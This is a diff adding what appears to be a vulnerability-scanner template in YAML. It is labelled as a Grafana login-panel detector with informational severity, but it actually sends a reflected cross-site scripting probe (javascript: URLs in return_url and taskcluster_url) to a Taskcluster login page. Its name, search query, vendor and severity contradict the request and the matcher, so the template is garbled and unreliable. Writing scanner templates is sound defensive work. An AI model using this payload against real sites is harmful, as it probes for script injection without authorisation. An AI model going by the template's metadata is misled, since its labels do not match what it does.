@@ -1,0 +1,30 @@
+id: grafana-detect
+
+info:
+  name: xssLogin Panel - Detect
+  author: organiccrap,AdamCrosser,bhutch
+  severity: info
+  description: Grafana login panel was detected.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
+    cvss-score: 0.0
+    cwe-id: CWE-200
+  metadata:
+    max-request: 1
+    shodan-query: title:"xss"
+    vendor: grafana
+    product: grafana
+    category: devops
+  tags: panel,grafana,detect
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/login.html?action=login&client_id=&return_url=javascript:alert()//&taskcluster_url=javascript:alert(document.domain);//&scope="
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Taskcluster Auth"
